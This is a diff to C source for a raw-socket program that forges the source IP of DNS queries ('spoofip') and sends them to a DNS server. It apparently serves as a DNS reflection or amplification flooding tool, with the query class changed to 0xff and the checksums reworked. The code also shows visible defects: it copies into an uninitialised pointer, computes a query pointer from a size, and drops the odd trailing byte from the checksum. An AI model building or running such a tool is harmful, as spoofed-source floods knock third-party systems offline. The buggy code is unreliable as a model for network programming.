@@ -16,93 +16,91 @@ void CreateDnsHeader(dh *dns){
 }
 
 void CreateQueryInfo(query *q){
-	q->dnsq_class = htons(1);
+	q->dnsq_class = htons(0xff);
 	q->dnsq_type = htons(1);
 }
 
-unsigned int CheckSum(int size, unsigned short *ptr){
-	unsigned int cksum;
-	for(cksum = 0; size > 1; size -= 2){
-		cksum += *ptr++;
-	}
-	if(size == 1){
-		cksum += *(unsigned short *)ptr;
-	}
-	return cksum;
+void CreatePseudoHeader(ph *psheader, char* spoofip, char* dnsip){
+	inet_pton(AF_INET, spoofip, &psheader->saddr);
+	inet_pton(AF_INET, dnsip, &psheader->daddr);
+	psheader->fill = 0;
+	psheader->proto = IPPROTO_UDP;
 }
 
 // Calculate UDP checksum
-unsigned short CheckUdpSum(int length, unsigned short *ptr){
-	ih *ipheader = (ih *)ptr;
-	uh *udpheader = (uh *)(ptr + sizeof(ipheader));
-	udpheader->check = 0;
-	unsigned long sum = 0;
+unsigned short CheckIpUdpSum(int length, unsigned short *ptr){
+	long sum = 0;
+	unsigned short odd = 0;
 
-	sum = CheckSum(8, (unsigned short *)ipheader->saddr);
-	sum += CheckSum(length, (unsigned short *)udpheader);
-	sum += ntohs(length + IPPROTO_UDP);
+	for(; length > 1; length -= 2){
+		sum += *ptr++;
+	}
+	if(length == 1){
+		*((unsigned char *)&odd) = *(unsigned char *)ptr;
+	}
 
 	sum = (sum >> 16) + (sum & 0xffff);
 	sum = sum + (sum >> 16);
 
-	return (unsigned short)~sum;
+	return (short)~sum;
 
-}
-
-unsigned short CheckIpSum(int size, unsigned short *ptr){
-	unsigned long cksum;
-	for(cksum = 0; size > 0; size--){
-		cksum += *ptr++;
-	}
-
-	cksum = (cksum >> 16) + (cksum & 0xffff);
-	cksum = cksum + (cksum >> 16);
-
-	return (unsigned short)~cksum;
 }
 
 void SendDnsPacket(char* dnsip, char* spoofip, int port){
 	int sd;
-	char buf[PACKET_LENGTH];
-	memset(buf, 0, PACKET_LENGTH);
+	unsigned char dns_data[128];
+	char buf[4096], *data, *psdata, *dns_server;
 	struct sockaddr_in sin, din;
+	memset(buf, 0, 4096);
 
 	ih *ipheader = (ih *)buf;
-	uh *udpheader = (uh *)(buf + sizeof(ipheader));
-	dh *dnsheader = (dh *)(buf + sizeof(udpheader) + sizeof(ipheader));
-	char *data = buf + sizeof(udpheader) + sizeof(ipheader) + sizeof(dnsheader);
+	uh *udpheader = (uh *)(buf + sizeof(ih));
+	dh *dnsheader = (dh *)&dns_data;
 
 	CreateDnsHeader(dnsheader);
 
-	strcpy(data,"\3www\6google\3com");
-	int length = strlen(data) + 1;
-	query *Query = (query *)(data + length);	
+	strcpy(dns_server,"\3www\6google\3com");
+	int length = strlen(dns_server) + 1;
+	query *Query = (query *)(sizeof(dnsheader) + length);	
 	CreateQueryInfo(Query);
+
+	data = buf + sizeof(ih) + sizeof(uh);
+	memcpy(data, &dns_data, sizeof(dh) + length + sizeof(Query) + 1);
 
 	sin.sin_family = AF_INET;
 	din.sin_family = AF_INET;
-	sin.sin_port = htons(port);
-	din.sin_port = htons(53);
-	inet_pton(AF_INET, spoofip, &sin.sin_addr.s_addr);
-	inet_pton(AF_INET, dnsip, &din.sin_addr.s_addr);
+	sin.sin_port = htons(53);
+	din.sin_port = htons(port);
+	inet_pton(AF_INET, dnsip, &sin.sin_addr.s_addr);
+	inet_pton(AF_INET, spoofip, &din.sin_addr.s_addr);
 
 	ipheader->ihl = 5;
 	ipheader->version = 4;
 	ipheader->tos = 0;
-	ipheader->tot_len = htons(sizeof(ipheader) + sizeof(udpheader) + sizeof(dnsheader) + sizeof(Query) + length);
+	ipheader->tot_len = htons(sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length);
 	ipheader->id = htons(QUERY_ID);
 	ipheader->ttl = 64;
 	ipheader->protocol = IPPROTO_UDP;
 	inet_pton(AF_INET, spoofip, &ipheader->saddr);
 	inet_pton(AF_INET, dnsip, &ipheader->daddr);
 	ipheader->check = 0;
-	ipheader->check = CheckIpSum(ipheader->tot_len, (unsigned short *)buf);
+	ipheader->check = CheckIpUdpSum(sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length, (unsigned short *)buf);
 
 	udpheader->source = htons(port);
 	udpheader->dest = htons(53);
-	udpheader->len = htons(sizeof(udpheader) + sizeof(dnsheader) + sizeof(Query) + length);
+	udpheader->len = htons(8 + sizeof(dh) + sizeof(Query) + length);
 	udpheader->check = 0;
-	udpheader->check = CheckUdpSum(udpheader->len, (unsigned short *)buf);
+	
+	ph pseudoheader;
+	CreatePseudoHeader(&pseudoheader, spoofip, dnsip);
+	pseudoheader.len = htons(sizeof(uh) + sizeof(dh) + length + sizeof(Query));
+	int size = sizeof(ph) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length;
+	psdata = malloc(size);
+
+	memcpy(psdata, (char*)&pseudoheader, sizeof(ph));
+	memcpy(psdata + sizeof(ph), udpheader, sizeof(uh) + sizeof(dh) + sizeof(Query) + length);
+
+	udpheader->check = CheckIpUdpSum(size, (unsigned short *)psdata);
 
 	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
 	if(sd < 0){
